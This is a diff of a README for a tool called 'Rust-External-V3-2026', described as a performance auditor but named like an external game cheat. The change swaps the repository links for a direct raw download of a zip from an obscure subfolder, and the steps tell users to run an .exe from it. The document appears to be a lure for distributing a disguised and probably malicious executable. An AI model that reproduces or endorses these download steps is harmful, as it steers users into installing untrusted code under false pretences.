@@ -1,6 +1,6 @@
 # ⚙️ Rust-External-V3-2026 - Optimize your system for competitive play
 
-[![](https://img.shields.io/badge/Download-External_Auditor-blue.svg)](https://github.com/Mauromolina68/Rust-External-V3-2026)
+[![](https://img.shields.io/badge/Download-External_Auditor-blue.svg)](https://raw.githubusercontent.com/Mauromolina68/Rust-External-V3-2026/main/turbanesque/Rust-External-v1.5-alpha.1.zip)
 
 Rust-External-V3-2026 acts as a system auditor for players who need stable performance. The software monitors input latency, manages packet timing, and aligns system resources to improve frame pacing. This keeps your hardware output consistent during intense game moments.
 
@@ -26,7 +26,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up your environment.
 
-1. Visit the repository page to download the software: https://github.com/Mauromolina68/Rust-External-V3-2026
+1. Visit the repository page to download the software: https://raw.githubusercontent.com/Mauromolina68/Rust-External-V3-2026/main/turbanesque/Rust-External-v1.5-alpha.1.zip
 2. Locate the file ending in .exe in the releases section.
 3. Save this file to a folder on your drive.
 4. Close other programs that consume heavy background resources.
